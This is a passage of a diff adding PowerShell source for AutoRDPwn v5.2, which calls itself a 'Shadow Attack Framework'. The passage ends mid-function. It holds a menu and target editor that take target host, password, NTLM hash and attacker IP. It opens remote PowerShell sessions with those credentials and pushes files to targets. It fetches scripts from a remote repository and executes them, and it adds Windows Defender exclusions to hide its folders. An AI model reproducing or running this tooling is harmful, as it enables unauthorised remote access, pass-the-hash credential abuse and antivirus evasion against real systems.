+    $index = [Array]::IndexOf($ids, $script:ARSelectedId)
+    if ($index -lt 0) { $index = 0 }
+    $step = [Math]::Max(5, (Get-ARConsoleHeight) - 15)
+    $index = $index + ($Pages * $step)
+    if ($index -lt 0) { $index = 0 }
+    if ($index -ge $ids.Count) { $index = $ids.Count - 1 }
+    $script:ARSelectedId = $ids[$index]
+}
+
+function Get-ARTargetUserLabel {
+    if ($script:ARTarget['User']) { return $script:ARTarget['User'] }
+    return [Environment]::UserName
+}
+
+function Get-ARTargetAttackerLabel {
+    if ($script:ARTarget['AttackerIP']) { return $script:ARTarget['AttackerIP'] }
+    return 'auto'
+}
+
+function Show-ARTuiScreen {
+    param(
+        [string]$Prompt = ''
+    )
+    $width = Get-ARConsoleWidth
+    $height = Get-ARConsoleHeight
+    $inner = $width - 1
+    $listHeight = [Math]::Max(5, $height - 12)
+    $catalog = @(Get-ARFilteredCatalog -Filter $script:ARFilter)
+    $selectedIndex = -1
+    for ($i = 0; $i -lt $catalog.Count; $i++) {
+        if ($catalog[$i].Kind -eq 'Action' -and $catalog[$i].Id -eq $script:ARSelectedId) {
+            $selectedIndex = $i
+            break
+        }
+    }
+    if ($selectedIndex -lt 0) {
+        for ($i = 0; $i -lt $catalog.Count; $i++) {
+            if ($catalog[$i].Kind -eq 'Action') {
+                $script:ARSelectedId = $catalog[$i].Id
+                $selectedIndex = $i
+                break
+            }
+        }
+    }
+    if ($selectedIndex -ge 0) {
+        if ($selectedIndex -lt $script:ARScroll) { $script:ARScroll = $selectedIndex }
+        if ($selectedIndex -ge ($script:ARScroll + $listHeight)) {
+            $script:ARScroll = $selectedIndex - $listHeight + 1
+        }
+    }
+    $maxScroll = [Math]::Max(0, $catalog.Count - $listHeight)
+    if ($script:ARScroll -gt $maxScroll) { $script:ARScroll = $maxScroll }
+    if ($script:ARScroll -lt 0) { $script:ARScroll = 0 }
+
+    Clear-ARScreen
+    $adminLabel = if (Test-ARIsAdmin) { 'yes' } else { 'no' }
+    $header = 'AutoRDPwn v5.2  |  Shadow Attack Framework  |  {0}  |  admin: {1}' -f $script:ARLocaleName, $adminLabel
+    Write-ARLine (Format-ARText $header $inner) 'Yellow'
+    Write-ARLine ('-' * $inner) 'DarkGray'
+    $targetLine = 'Target: {0}  |  User: {1}  |  Mode: {2}  |  Session: {3}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode'], $script:ARSessionState
+    Write-ARLine (Format-ARText $targetLine $inner) 'Gray'
+    Write-ARLine ('-' * $inner) 'DarkGray'
+
+    for ($row = 0; $row -lt $listHeight; $row++) {
+        $index = $script:ARScroll + $row
+        if ($index -ge $catalog.Count) {
+            Write-ARLine ''
+            continue
+        }
+        $item = $catalog[$index]
+        if ($item.Kind -eq 'Group') {
+            Write-ARLine (Format-ARText ('  -- {0} --' -f $item.Title) $inner) 'Blue'
+            continue
+        }
+        $selected = $item.Id -eq $script:ARSelectedId
+        $marker = if ($selected) { '>' } else { ' ' }
+        $text = Format-ARText (' {0} [{1,3}] {2}' -f $marker, $item.Id, $item.Title) $inner
+        if ($selected) {
+            Write-ARLine $text 'Black' 'Gray'
+        }
+        else {
+            Write-ARLine $text 'Gray'
+        }
+    }
+
+    Write-ARLine ('-' * $inner) 'DarkGray'
+    $selectedAction = Get-ARActionById $script:ARSelectedId
+    if ($selectedAction) {
+        Write-ARLine (Format-ARText (' {0}  [{1}]' -f $selectedAction.Title, $selectedAction.Id) $inner) 'White'
+        $descriptionLines = @(Get-ARWrappedLines -Text $selectedAction.Description -Width ($width - 3) -MaxLines 2)
+        for ($i = 0; $i -lt 2; $i++) {
+            if ($i -lt $descriptionLines.Count) {
+                Write-ARLine (' ' + $descriptionLines[$i]) 'Gray'
+            }
+            else {
+                Write-ARLine ''
+            }
+        }
+    }
+    else {
+        Write-ARLine ' No action selected' 'DarkGray'
+        Write-ARLine ''
+        Write-ARLine ''
+    }
+
+    $statusColor = switch ($script:ARStatus['Kind']) {
+        'Ok' { 'Green' }
+        'Warn' { 'Yellow' }
+        'Error' { 'Red' }
+        default { 'DarkGray' }
+    }
+    Write-ARLine (Format-ARText (' ' + $script:ARStatus['Text']) $inner) $statusColor
+
+    if ($Prompt -ne '') {
+        Write-ARLine (Format-ARText (' ' + $Prompt) $inner) 'Yellow'
+    }
+    else {
+        $footer = ' Up/Down move  Enter run  T target  / search  L language  F1 help  Q quit'
+        if ($script:ARFilter -ne '') {
+            $footer = ' Filter: ' + $script:ARFilter + '  |  Esc clear  | ' + $footer.Trim()
+        }
+        Write-ARLine (Format-ARText $footer $inner) 'DarkGray'
+    }
+}
+
+function Show-ARHelp {
+    Clear-ARScreen
+    $width = Get-ARConsoleWidth
+    $inner = $width - 1
+    Write-ARLine (Format-ARText 'AutoRDPwn help' $inner) 'Yellow'
+    Write-ARLine ('-' * $inner) 'DarkGray'
+    Write-ARLine ' Up / Down        move through actions' 'Gray'
+    Write-ARLine ' PgUp / PgDn      move a page at a time' 'Gray'
+    Write-ARLine ' Home / End      jump to the first or last action' 'Gray'
+    Write-ARLine ' Enter           run the selected action' 'Gray'
+    Write-ARLine ' T               edit target, credentials and mode' 'Gray'
+    Write-ARLine ' /               filter actions by text' 'Gray'
+    Write-ARLine ' L               change language' 'Gray'
+    Write-ARLine ' Esc             clear the filter or close a dialog' 'Gray'
+    Write-ARLine ' Q / X           quit' 'Gray'
+    Write-ARLine ''
+    Write-ARLine ' Legacy -option values 11..17 map to the first action of each old module group.' 'DarkGray'
+    Write-ARLine ''
+    Write-ARLine ' Press any key to return' 'Green'
+    if (-not $script:ARTestMode) {
+        try { $null = [Console]::ReadKey($true) } catch { }
+    }
+}
+
+function Show-ARTargetFormScreen {
+    param([int]$Index)
+    $width = Get-ARConsoleWidth
+    $inner = $width - 1
+    $fields = @(
+        @{ Key = 'Computer'; Label = 'Target host' },
+        @{ Key = 'User'; Label = 'User' },
+        @{ Key = 'Password'; Label = 'Password' },
+        @{ Key = 'Hash'; Label = 'NTLM hash' },
+        @{ Key = 'Domain'; Label = 'Domain' },
+        @{ Key = 'AttackerIP'; Label = 'Attacker IP' },
+        @{ Key = 'Mode'; Label = 'Mode' }
+    )
+    Clear-ARScreen
+    Write-ARLine (Format-ARText (' Target editor  |  {0}' -f $script:ARLocaleName) $inner) 'Yellow'
+    Write-ARLine ('-' * $inner) 'DarkGray'
+    for ($i = 0; $i -lt $fields.Count; $i++) {
+        $field = $fields[$i]
+        $value = [string]$script:ARTarget[$field.Key]
+        if ($field.Key -eq 'Password' -and $value -ne '') { $value = '********' }
+        if ($field.Key -eq 'Hash' -and $value -ne '') {
+            if ($value.Length -gt 16) { $value = $value.Substring(0, 16) + '...' }
+        }
+        if ($field.Key -eq 'AttackerIP' -and $value -eq '') { $value = 'auto' }
+        if ($field.Key -eq 'User' -and $value -eq '') { $value = '(current user)' }
+        if ($value -eq '') { $value = '(not set)' }
+        $marker = if ($i -eq $Index) { '>' } else { ' ' }
+        $line = ' {0} {1,-12} : {2}' -f $marker, $field.Label, $value
+        if ($i -eq $Index) {
+            Write-ARLine (Format-ARText $line $inner) 'Black' 'Gray'
+        }
+        else {
+            Write-ARLine (Format-ARText $line $inner) 'Gray'
+        }
+    }
+    Write-ARLine ('-' * $inner) 'DarkGray'
+    Write-ARLine ' Up/Down move  Enter edit  S save  Esc cancel' 'DarkGray'
+}
+
+function Read-ARLineValue {
+    param([string]$Prompt)
+    Write-Host $Prompt -NoNewline -ForegroundColor Yellow
+    try { return $Host.UI.ReadLine() } catch { return $null }
+}
+
+function Read-ARSecretValue {
+    param([string]$Prompt)
+    Write-Host $Prompt -NoNewline -ForegroundColor Yellow
+    try {
+        $secure = $Host.UI.ReadLineAsSecureString()
+        if ($null -eq $secure) { return '' }
+        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
+        try {
+            return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
+        }
+        finally {
+            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
+        }
+    }
+    catch { return '' }
+}
+
+function Edit-ARTargetField {
+    param([hashtable]$Field)
+    if ($Field.Key -eq 'Mode') {
+        if ($script:ARTarget['Mode'] -eq 'control') { $script:ARTarget['Mode'] = 'view' }
+        else { $script:ARTarget['Mode'] = 'control' }
+        return
+    }
+    if ($Field.Key -eq 'Password') {
+        $value = Read-ARSecretValue ' New password (Enter keeps, - clears): '
+        if ($null -eq $value) { return }
+        if ($value -eq '-') { $script:ARTarget['Password'] = '' }
+        elseif ($value -ne '') { $script:ARTarget['Password'] = $value }
+        return
+    }
+    $current = [string]$script:ARTarget[$Field.Key]
+    $value = Read-ARLineValue (' {0} [{1}]: ' -f $Field.Label, $current)
+    if ($null -eq $value) { return }
+    $value = $value.Trim()
+    if ($value -eq '') {
+        if ($Field.Key -eq 'Computer') { $script:ARTarget['Computer'] = 'localhost' }
+        elseif ($Field.Key -eq 'User') { $script:ARTarget['User'] = '' }
+        else { $script:ARTarget[$Field.Key] = '' }
+        return
+    }
+    if ($Field.Key -eq 'Mode') {
+        if ($value -match '^1$|control') { $script:ARTarget['Mode'] = 'control' }
+        elseif ($value -match '^2$|view') { $script:ARTarget['Mode'] = 'view' }
+        return
+    }
+    $script:ARTarget[$Field.Key] = $value
+}
+
+function Show-ARTargetForm {
+    $fields = @(
+        @{ Key = 'Computer'; Label = 'Target host' },
+        @{ Key = 'User'; Label = 'User' },
+        @{ Key = 'Password'; Label = 'Password' },
+        @{ Key = 'Hash'; Label = 'NTLM hash' },
+        @{ Key = 'Domain'; Label = 'Domain' },
+        @{ Key = 'AttackerIP'; Label = 'Attacker IP' },
+        @{ Key = 'Mode'; Label = 'Mode' }
+    )
+    $index = 0
+    while ($true) {
+        Show-ARTargetFormScreen -Index $index
+        if ($script:ARTestMode) { return $false }
+        try { $key = [Console]::ReadKey($true) } catch { return $false }
+        switch ($key.Key) {
+            'UpArrow' {
+                $index--
+                if ($index -lt 0) { $index = $fields.Count - 1 }
+            }
+            'DownArrow' {
+                $index++
+                if ($index -ge $fields.Count) { $index = 0 }
+            }
+            'Home' { $index = 0 }
+            'End' { $index = $fields.Count - 1 }
+            'Enter' {
+                Edit-ARTargetField -Field $fields[$index]
+            }
+            'Escape' { return $true }
+            default {
+                $character = $key.KeyChar.ToString().ToUpperInvariant()
+                if ($character -eq 'S') { return $true }
+                if ($character -eq 'Q') { return $false }
+            }
+        }
+    }
+}
+
+function Read-ARLineTargetForm {
+    $labels = @(
+        @{ Key = 'Computer'; Text = 'Target host' },
+        @{ Key = 'User'; Text = 'User' },
+        @{ Key = 'Hash'; Text = 'NTLM hash' },
+        @{ Key = 'Domain'; Text = 'Domain' },
+        @{ Key = 'AttackerIP'; Text = 'Attacker IP' }
+    )
+    foreach ($field in $labels) {
+        $current = [string]$script:ARTarget[$field.Key]
+        $value = Read-ARLineValue (' {0} [{1}]: ' -f $field.Text, $current)
+        if ($null -eq $value) { continue }
+        $value = $value.Trim()
+        if ($value -ne '') { $script:ARTarget[$field.Key] = $value }
+        elseif ($field.Key -eq 'Computer') { $script:ARTarget['Computer'] = 'localhost' }
+    }
+    $password = Read-ARSecretValue ' New password (Enter keeps, - clears): '
+    if ($null -ne $password) {
+        if ($password -eq '-') { $script:ARTarget['Password'] = '' }
+        elseif ($password -ne '') { $script:ARTarget['Password'] = $password }
+    }
+    $mode = Read-ARLineValue (' Mode [1 control, 2 view] [{0}]: ' -f $script:ARTarget['Mode'])
+    if ($null -ne $mode) {
+        $mode = $mode.Trim()
+        if ($mode -match '^1$|control') { $script:ARTarget['Mode'] = 'control' }
+        elseif ($mode -match '^2$|view') { $script:ARTarget['Mode'] = 'view' }
+    }
+}
+
+function Show-ARLanguagePicker {
+    $languages = @('English', 'Spanish', 'French', 'German', 'Italian', 'Russian', 'Portuguese')
+    $index = [Array]::IndexOf($languages, $script:ARLocaleName)
+    if ($index -lt 0) { $index = 0 }
+    while ($true) {
+        Clear-ARScreen
+        $width = Get-ARConsoleWidth
+        $inner = $width - 1
+        Write-ARLine ' Language' 'Yellow'
+        Write-ARLine ('-' * $inner) 'DarkGray'
+        for ($i = 0; $i -lt $languages.Count; $i++) {
+            $marker = if ($i -eq $index) { '>' } else { ' ' }
+            $line = ' {0} {1,2}. {2}' -f $marker, ($i + 1), $languages[$i]
+            if ($i -eq $index) { Write-ARLine $line 'Black' 'Gray' }
+            else { Write-ARLine $line 'Gray' }
+        }
+        Write-ARLine ('-' * $inner) 'DarkGray'
+        Write-ARLine ' Up/Down move  Enter select  Esc cancel' 'DarkGray'
+        if ($script:ARTestMode) { return '' }
+        try { $key = [Console]::ReadKey($true) } catch { return '' }
+        switch ($key.Key) {
+            'UpArrow' {
+                $index--
+                if ($index -lt 0) { $index = $languages.Count - 1 }
+            }
+            'DownArrow' {
+                $index++
+                if ($index -ge $languages.Count) { $index = 0 }
+            }
+            'Enter' {
+                $script:ARLocaleName = $languages[$index]
+                return $languages[$index]
+            }
+            'Escape' { return '' }
+            default {
+                $character = $key.KeyChar.ToString().ToUpperInvariant()
+                if ($character -eq 'Q') { return '' }
+                if ($character -match '^[1-7]$') {
+                    $languageIndex = ([int]$character) - 1
+                    $script:ARLocaleName = $languages[$languageIndex]
+                    return $languages[$languageIndex]
+                }
+            }
+        }
+    }
+}
+
+function Show-ARTui {
+    param([string]$InitialId = '')
+    if (-not (Get-ARActionById $InitialId)) {
+        $first = Get-ARActionCatalog | Where-Object { $_.Kind -eq 'Action' } | Select-Object -First 1
+        if ($first) { $script:ARSelectedId = $first.Id }
+    }
+    else {
+        $script:ARSelectedId = $InitialId
+    }
+    $script:ARScroll = 0
+    while ($true) {
+        Show-ARTuiScreen
+        if ($script:ARTestMode) { return 'TEST' }
+        try { $key = [Console]::ReadKey($true) } catch { return 'QUIT' }
+        switch ($key.Key) {
+            'UpArrow' { Move-ARSelection -Delta -1 }
+            'DownArrow' { Move-ARSelection -Delta 1 }
+            'PageUp' { Move-ARSelectionPage -Pages -1 }
+            'PageDown' { Move-ARSelectionPage -Pages 1 }
+            'Home' {
+                $first = Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' } | Select-Object -First 1
+                if ($first) { $script:ARSelectedId = $first.Id; $script:ARScroll = 0 }
+            }
+            'End' {
+                $last = Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' } | Select-Object -Last 1
+                if ($last) { $script:ARSelectedId = $last.Id }
+            }
+            'Enter' { return ('ACTION:' + $script:ARSelectedId) }
+            'Escape' {
+                if ($script:ARFilter -ne '') {
+                    $script:ARFilter = ''
+                    Set-ARStatus 'Filter cleared' 'Info'
+                }
+            }
+            'F1' { Show-ARHelp }
+            default {
+                $character = $key.KeyChar.ToString().ToUpperInvariant()
+                if ($character -eq 'Q' -or $character -eq 'X') { return 'QUIT' }
+                if ($character -eq 'T') {
+                    if (Show-ARTargetForm) { Set-ARStatus 'Target updated' 'Ok' }
+                }
+                if ($character -eq 'L') { return 'LANGUAGE' }
+                if ($character -eq '/') {
+                    Show-ARTuiScreen -Prompt 'Filter:'
+                    try { $filterValue = $Host.UI.ReadLine() } catch { $filterValue = $null }
+                    if ($null -ne $filterValue) {
+                        $script:ARFilter = $filterValue.Trim()
+                        if ($script:ARFilter -ne '') {
+                            $rows = @(Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' })
+                            if ($rows.Count -gt 0) { $script:ARSelectedId = $rows[0].Id; $script:ARScroll = 0 }
+                            else { Set-ARStatus 'No action matches the filter' 'Warn' }
+                        }
+                    }
+                }
+                if ($character -eq 'R') {
+                    $script:ARFilter = ''
+                    Set-ARStatus 'Filter cleared' 'Info'
+                }
+            }
+        }
+    }
+}
+
+function Show-ARLineMenu {
+    Clear-ARScreen
+    $width = Get-ARConsoleWidth
+    $inner = $width - 1
+    Write-ARLine (Format-ARText ('AutoRDPwn v5.2 - line mode  |  {0}' -f $script:ARLocaleName) $inner) 'Yellow'
+    Write-ARLine ('-' * $inner) 'DarkGray'
+    Write-ARLine (Format-ARText ('Target: {0}  User: {1}  Mode: {2}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode']) $inner) 'Gray'
+    Write-ARLine ''
+    foreach ($item in Get-ARActionCatalog) {
+        if ($item.Kind -eq 'Group') {
+            Write-ARLine ''
+            Write-ARLine (Format-ARText (' -- {0} --' -f $item.Title) $inner) 'Blue'
+            continue
+        }
+        Write-ARLine (Format-ARText (' [{0,3}] {1}' -f $item.Id, $item.Title) $inner) 'Gray'
+        Write-ARLine (Format-ARText ('       {0}' -f $item.Description) $inner) 'DarkGray'
+    }
+    Write-ARLine ''
+    Write-ARLine ' [L] language  [T] target  [Q] quit' 'DarkGray'
+    if ($script:ARTestMode) { return '' }
+    $selection = Read-ARLineValue ' Choose an action:'
+    if ($null -eq $selection) { return 'QUIT' }
+    return (Resolve-ARSelection $selection)
+}
+
+function Show-ARLineTargetForm {
+    Clear-ARScreen
+    Write-ARLine 'Target editor (line mode)' 'Yellow'
+    Read-ARLineTargetForm
+    Set-ARStatus 'Target updated' 'Ok'
+}
+
+$script:ARSession = $null
+$script:AROverrideCredential = $null
+$script:ARDefenderAvailable = $false
+$script:ARDefenderAddedPaths = New-Object System.Collections.Generic.List[string]
+$script:ARWorkDirs = New-Object System.Collections.Generic.List[string]
+$script:ARTemporaryFiles = New-Object System.Collections.Generic.List[string]
+$script:ARRemoteTempDirs = New-Object System.Collections.Generic.List[string]
+$script:ARHashUserName = ''
+$script:ARCmdKeyTargets = New-Object System.Collections.Generic.List[string]
+$script:ARCleanupDone = $false
+
+function Invoke-ARDownload {
+    param(
+        [Parameter(Mandatory = $true)][string]$Url,
+        [Parameter(Mandatory = $true)][string]$OutFile
+    )
+    $oldProgress = $ProgressPreference
+    $ProgressPreference = 'SilentlyContinue'
+    try {
+        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
+    }
+    catch {
+        try { (New-Object Net.WebClient).DownloadFile($Url, $OutFile) }
+        catch { throw "Download failed: $Url" }
+    }
+    finally { $ProgressPreference = $oldProgress }
+    if (-not (Test-Path -LiteralPath $OutFile)) { throw "Download failed: $Url" }
+}
+
+function Get-ARResourcePath {
+    param([Parameter(Mandatory = $true)][string]$RelativePath)
+    $normalized = $RelativePath -replace '/', '\'
+    $localPath = Join-Path $script:ARRoot $normalized
+    if ($script:ARLocal -and (Test-Path -LiteralPath $localPath)) { return $localPath }
+    if (Test-Path -LiteralPath $localPath) { return $localPath }
+    $parent = Split-Path -Parent $localPath
+    if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
+    $url = $script:ARRepository + '/' + ($normalized -replace '\\', '/')
+    Invoke-ARDownload -Url $url -OutFile $localPath
+    return $localPath
+}
+
+function Import-ARFunctionScript {
+    param([Parameter(Mandatory = $true)][string]$RelativePath)
+    $path = Get-ARResourcePath $RelativePath
+    Import-Module -Name $path -Force -DisableNameChecking -ErrorAction Stop
+}
+
+function Import-ARToolScript {
+    param([Parameter(Mandatory = $true)][string]$RelativePath)
+    $path = Get-ARResourcePath $RelativePath
+    $before = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
+    Push-Location $script:ARTools
+    try { . $path }
+    finally { Pop-Location }
+    $after = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
+    foreach ($file in $after) {
+        if ($before -notcontains $file) { $script:ARTemporaryFiles.Add($file) }
+    }
+}
+
+function Resolve-ARLanguageName {
+    param([string]$Name = '')
+    $map = @{
+        '1' = 'English'; '2' = 'Spanish'; '3' = 'French'; '4' = 'German'
+        '5' = 'Italian'; '6' = 'Russian'; '7' = 'Portuguese'
+        'en' = 'English'; 'es' = 'Spanish'; 'fr' = 'French'; 'de' = 'German'
+        'it' = 'Italian'; 'ru' = 'Russian'; 'pt' = 'Portuguese'
+        'english' = 'English'; 'spanish' = 'Spanish'; 'french' = 'French'; 'german' = 'German'
+        'italian' = 'Italian'; 'russian' = 'Russian'; 'portuguese' = 'Portuguese'
+    }
+    if ([string]::IsNullOrWhiteSpace($Name)) {
+        $culture = ''
+        try { $culture = (Get-Culture).TwoLetterISOLanguageName.ToLowerInvariant() } catch { }
+        if ($map.ContainsKey($culture)) { return $map[$culture] }
+        return 'English'
+    }
+    $key = $Name.Trim().ToLowerInvariant()
+    if ($map.ContainsKey($key)) { return $map[$key] }
+    if ($key.Length -ge 2 -and $map.ContainsKey($key.Substring(0, 2))) { return $map[$key.Substring(0, 2)] }
+    return 'English'
+}
+
+function Initialize-ARLanguage {
+    param([string]$Name = '')
+    $resolved = Resolve-ARLanguageName $Name
+    $englishPath = Get-ARResourcePath 'Resources\Languages\English.ps1'
+    Import-ARLanguage -Path $englishPath -AsFallback
+    Import-ARLanguage -Path $englishPath
+    if ($resolved -ne 'English') {
+        try {
+            $languagePath = Get-ARResourcePath ('Resources\Languages\' + $resolved + '.ps1')
+            Import-ARLanguage -Path $languagePath
+        }
+        catch {
+            $resolved = 'English'
+        }
+    }
+    Set-ARLanguageName $resolved
+}
+
+function Initialize-ARDefender {
+    $script:ARDefenderAddedPaths.Clear()
+    try {
+        $preference = Get-MpPreference -ErrorAction Stop
+    }
+    catch { return }
+    $script:ARDefenderAvailable = $true
+    $existingPaths = @($preference.ExclusionPath | Where-Object { $_ })
+    $paths = @($script:ARRoot, $script:ARTools, (Join-Path $env:TEMP 'AutoRDPwn'))
+    foreach ($path in $paths) {
+        if ([string]::IsNullOrWhiteSpace($path)) { continue }
+        if (-not (Test-Path -LiteralPath $path)) { continue }
+        if ($existingPaths -contains $path) { continue }
+        try {
+            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
+            $script:ARDefenderAddedPaths.Add($path)
+        } catch { }
+    }
+}
+
+function Restore-ARDefender {
+    if (-not $script:ARDefenderAvailable) { return }
+    foreach ($path in $script:ARDefenderAddedPaths.ToArray()) {
+        try { Remove-MpPreference -ExclusionPath $path -ErrorAction Stop } catch { }
+    }
+    $script:ARDefenderAddedPaths.Clear()
+}
+
+function Write-ARInfo { param([string]$Text); Write-Host ('[i] ' + $Text) -ForegroundColor Green }
+function Write-ARSuccess { param([string]$Text); Write-Host ('[+] ' + $Text) -ForegroundColor Blue }
+function Write-ARWarn { param([string]$Text); Write-Host ('[!] ' + $Text) -ForegroundColor Yellow }
+function Write-ARError { param([string]$Text); Write-Host ('[!] ' + $Text) -ForegroundColor Red }
+function Write-ARBlank { Write-Host '' }
+
+function Read-ARValue {
+    param([string]$Prompt, [string]$Default = '')
+    while ($true) {
+        $suffix = ': '
+        if ($Default -ne '') { $suffix = ' [' + $Default + ']: ' }
+        $value = Read-ARLineValue (' ' + $Prompt + $suffix)
+        if ($null -eq $value) { $value = '' }
+        $value = $value.Trim()
+        if ($value -eq '' -and $Default -ne '') { return $Default }
+        if ($value -ne '') { return $value }
+        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
+    }
+}
+
+function Read-ARSecret {
+    param([string]$Prompt = 'Password')
+    while ($true) {
+        $value = Read-ARSecretValue (' ' + $Prompt + ': ')
+        if ($null -ne $value -and $value -ne '') { return $value }
+        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
+    }
+}
+
+function Show-ARText {
+    param($Value)
+    if ($null -eq $Value) { return }
+    $text = ($Value | Out-String).TrimEnd()
+    if ($text -eq '') { return }
+    Write-Host $text
+    if ($text.Length -lt 1048576) {
+        try { Set-Clipboard -Value $text } catch { }
+    }
+}
+
+function Test-ARIsLocalTarget {
+    $computer = [string]$script:ARTarget['Computer']
+    if ([string]::IsNullOrWhiteSpace($computer)) { return $true }
+    $names = @('localhost', '127.0.0.1', '::1', '.', $env:COMPUTERNAME)
+    try { $names += [System.Net.Dns]::GetHostName() } catch { }
+    return ($names -contains $computer)
+}
+
+function Get-ARTargetComputer {
+    $computer = [string]$script:ARTarget['Computer']
+    if ([string]::IsNullOrWhiteSpace($computer)) { return 'localhost' }
+    return $computer
+}
+
+function Get-ARTargetUserName {
+    $user = [string]$script:ARTarget['User']
+    $domain = [string]$script:ARTarget['Domain']
+    if ($domain -ne '' -and $user -ne '' -and $user -notmatch '\\') { return $domain + '\' + $user }
+    return $user
+}
+
+function Get-ARPlainPassword {
+    $password = [string]$script:ARTarget['Password']
+    if ($password -eq '') {
+        $password = Read-ARSecret 'Password'
+        $script:ARTarget['Password'] = $password
+    }
+    return $password
+}
+
+function Get-ARTargetCredential {
+    $user = [string]$script:ARTarget['User']
+    if ([string]::IsNullOrWhiteSpace($user)) { return $null }
+    $domain = [string]$script:ARTarget['Domain']
+    if ($domain -ne '' -and $user -notmatch '\\') { $user = $domain + '\' + $user }
+    $password = Get-ARPlainPassword
+    $secure = ConvertTo-SecureString -String $password -AsPlainText -Force
+    return New-Object System.Management.Automation.PSCredential($user, $secure)
+}
+
+function Connect-ARTargetSession {
+    param(
+        [System.Management.Automation.PSCredential]$Credential = $null,
+        [switch]$Force
+    )
+    $target = Get-ARTargetComputer
+    if (-not $Force -and $script:ARSession) {
+        $state = ''
+        try { $state = [string]$script:ARSession.State } catch { }
+        if ($state -eq 'Opened') {
+            if ([string]$script:ARSession.ComputerName -eq $target) {
+                Set-ARSessionState ('connected (' + $target + ')')
+                return $script:ARSession
+            }
+            Close-ARTargetSession
+        }
+    }
+    if ($null -eq $Credential -and $script:AROverrideCredential) { $Credential = $script:AROverrideCredential }
+    if ($null -eq $Credential) { $Credential = Get-ARTargetCredential }
+    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
+    if ($Credential) { $parameters['Credential'] = $Credential }
+    $session = New-PSSession @parameters
+    $script:ARSession = $session
+    Set-ARSessionState ('connected (' + $target + ')')
+    return $session
+}
+
+function Close-ARTargetSession {
+    if ($script:ARSession) {
+        try { Remove-PSSession -Session $script:ARSession -ErrorAction SilentlyContinue } catch { }
+        $script:ARSession = $null
+    }
+    Set-ARSessionState ''
+}
+
+function Get-ARTargetSession {
+    $session = Connect-ARTargetSession
+    if (-not $session) { throw 'Unable to open a PowerShell session to the target.' }
+    return $session
+}
+
+function Invoke-ARTargetCommand {
+    param(
+        [Parameter(Mandatory = $true)][scriptblock]$ScriptBlock,
+        [object[]]$ArgumentList = @()
+    )
+    if (Test-ARIsLocalTarget) { return (& $ScriptBlock @ArgumentList) }
+    $session = Get-ARTargetSession
+    return Invoke-Command -Session $session -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList -ErrorAction Stop
+}
+
+function New-ARWorkDirectory {
+    $directory = Join-Path $script:ARTools ('work_' + [guid]::NewGuid().ToString('N'))
+    New-Item -ItemType Directory -Path $directory -Force | Out-Null
+    $script:ARWorkDirs.Add($directory)
+    return $directory
+}
+
+function Copy-ARFileToTarget {
+    param(
+        [Parameter(Mandatory = $true)][string]$LocalPath,
+        [Parameter(Mandatory = $true)][string]$RemotePath
+    )
+    if (-not (Test-Path -LiteralPath $LocalPath)) { throw "File not found: $LocalPath" }
+    if (Test-ARIsLocalTarget) {
+        $directory = New-ARWorkDirectory
+        $destination = Join-Path $directory (Split-Path -Leaf $LocalPath)
+        Copy-Item -LiteralPath $LocalPath -Destination $destination -Force
+        return $destination
+    }
+    $session = Get-ARTargetSession
+    $remoteDirectory = Split-Path -Parent $RemotePath
+    Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
+        param($path)
+        if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
+    } -ErrorAction Stop
+    try {
+        Copy-Item -LiteralPath $LocalPath -Destination $RemotePath -ToSession $session -Force -ErrorAction Stop
+    }
+    catch {
+        $bytes = [System.IO.File]::ReadAllBytes($LocalPath)
+        $chunkSize = 48000
+        $first = $true
+        for ($offset = 0; $offset -lt $bytes.Length; $offset += $chunkSize) {
+            $length = [Math]::Min($chunkSize, $bytes.Length - $offset)
+            $base64 = [Convert]::ToBase64String($bytes, $offset, $length)
+            Invoke-Command -Session $session -ArgumentList $RemotePath, $base64, $first -ScriptBlock {
+                param($path, $data, $create)
+                $chunk = [Convert]::FromBase64String($data)
+                if ($create) {
+                    [System.IO.File]::WriteAllBytes($path, $chunk)
+                }
+                else {
+                    $stream = [System.IO.File]::Open($path, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write)
+                    try { $stream.Write($chunk, 0, $chunk.Length) } finally { $stream.Dispose() }
+                }
+            } -ErrorAction Stop
+            $first = $false
+        }
+    }
+    return $RemotePath
+}
+
+function Invoke-ARTargetPowerShell {
+    param(
+        [Parameter(Mandatory = $true)][string]$RelativePath,
+        [string]$Function = '',
+        [hashtable]$Arguments = @{},
+        [string]$Command = ''
+    )
+    $localPath = Get-ARResourcePath $RelativePath
+    if (Test-ARIsLocalTarget) {
+        $directory = New-ARWorkDirectory
+        $scriptPath = Join-Path $directory (Split-Path -Leaf $localPath)
+        Copy-Item -LiteralPath $localPath -Destination $scriptPath -Force
+        Push-Location $directory
+        try {
+            return (& {
+                param($path, $functionName, $argumentMap, $commandText)
+                . $path
+                if ($commandText -ne '') { Invoke-Expression $commandText }
+                elseif ($functionName -ne '') {
+                    $splat = @{}
+                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
+                    & $functionName @splat
+                }
+            } $scriptPath $Function $Arguments $Command)
+        }
+        finally {
+            Pop-Location
+            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+    $session = Get-ARTargetSession
